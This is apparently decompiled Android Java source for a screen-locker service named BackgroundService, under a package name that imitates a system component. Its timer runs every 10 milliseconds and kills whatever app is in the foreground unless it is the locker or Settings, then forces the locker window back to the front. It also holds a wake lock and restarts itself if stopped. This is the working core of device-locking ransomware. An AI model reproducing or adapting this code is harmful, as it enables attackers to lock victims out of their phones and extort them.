package com.android.locker;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.Process;
import com.android.locker.MainActivity.mainActivity;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class BackgroundService extends Service {
    public static BackgroundService Activity = null;
    public static Timer LockerExecutor = null;
    public static WakeLock wakeLock;

    public void onStart(Intent intent, int startId) {
        Activity = this;
        wakeLock = ((PowerManager) getSystemService("power")).newWakeLock(1, "locker");
        wakeLock.acquire();
        startTimer(LockerExecutor, LockerTimer(), 0, 10);
        super.onStart(intent, startId);
    }

    public void startTimer(Timer t, TimerTask tt, long delay, long period) {
        if (t != null) {
            t.cancel();
        }
        new Timer().scheduleAtFixedRate(tt, delay, period);
    }

    public static void BringToFront(Context ctx) {
        try {
            Intent intent = new Intent(ctx.getApplicationContext(), mainActivity.class);
            intent.setFlags(272629760);
            ctx.startActivity(intent);
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private TimerTask LockerTimer() {
        return new TimerTask() {
            public void run() {
                try {
                    if (!(mainActivity.Activity == null || mainActivity.STOP || !((PowerManager) mainActivity.Activity.getSystemService("power")).isScreenOn())) {
                        ActivityManager am = (ActivityManager) mainActivity.Activity.getSystemService("activity");
                        List<RunningTaskInfo> taskInfo = am.getRunningTasks(1);
                        ComponentName componentInfo = ((RunningTaskInfo) taskInfo.get(0)).topActivity;
                        String PN = componentInfo.getPackageName();
                        if (!(PN.equals("com.android.locker") || PN.equals("com.android.settings"))) {
                            Process.killProcess(((RunningTaskInfo) taskInfo.get(0)).id);
                            mainActivity.Activity.finishActivity(((RunningTaskInfo) taskInfo.get(0)).id);
                            am.killBackgroundProcesses(componentInfo.getPackageName());
                            BackgroundService.BringToFront(mainActivity.Activity.getApplicationContext());
                        }
                    }
                    if (BackgroundService.Activity == null) {
                        Intent i = new Intent();
                        i.setAction("com.android.locker.BackgroundService");
                        BackgroundService.this.getApplicationContext().startService(i);
                    }
                } catch (Throwable e) {
                    e.printStackTrace();
                }
            }
        };
    }

    public IBinder onBind(Intent intent) {
        return null;
    }
}
